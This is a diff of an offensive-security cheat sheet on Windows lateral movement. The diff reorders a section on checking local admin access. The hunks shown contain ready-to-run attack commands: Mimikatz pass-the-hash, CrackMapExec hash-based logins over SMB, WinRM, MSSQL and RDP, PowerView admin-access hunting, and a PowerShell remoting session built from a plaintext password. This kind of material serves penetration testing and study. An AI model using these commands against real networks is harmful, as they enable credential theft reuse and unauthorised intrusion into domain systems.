@@ -1,8 +1,8 @@
 # Lateral Movement
 * [General](#General)
+* [Check Local Admin Access](#Check-Local-Admin-Access)  
 * [Pass The Hash](#Pass-The-Hash)
   * [Overpass The Hash](#Overpass-The-Hash)
-* [Check Local Admin Access](#Check-Local-Admin-Access)  
 * [Lateral Movement Techniques](#Lateral-Movement-Techniques)
   * [PSSession](#PSSession) 
   * [PSExec](#PSExec)
@@ -35,6 +35,31 @@ runas /netonly /user:<DOMAIN>\<USER> powershell.exe
 #### Mimikatz
 ```
 mimikatz.exe sekurlsa::pth /domain:<DOMAIN> /user:<USER> /rc4:<HASH>
+```
+
+## Check Local Admin Access
+#### Crackmapexec
+```
+cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+cme winrm <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+cme mssql <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+cme rdp <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+```
+
+#### Powerview
+```
+Find-LocalAdminAccess -Verbose
+```
+
+### Other scripts
+```
+. ./Find-WMILocalAdminAccess.ps1
+Find-WMILocalAdminAccess
+```
+
+```
+. ./Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess
 ```
 
 ## Pass the hash
@@ -131,31 +156,6 @@ $password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
 $sess = new-pssession -credential $creds -computername <TARGET FQDN>
 enter-pssession $sess
-```
-
-## Check Local Admin Access
-#### Crackmapexec
-```
-cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
-cme winrm <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
-cme mssql <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
-cme rdp <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
-```
-
-#### Powerview
-```
-Find-LocalAdminAccess -Verbose
-```
-
-### Other scripts
-```
-. ./Find-WMILocalAdminAccess.ps1
-Find-WMILocalAdminAccess
-```
-
-```
-. ./Find-PSRemotingLocalAdminAccess.ps1
-Find-PSRemotingLocalAdminAccess
 ```
 
 ## Lateral Movement Techniques
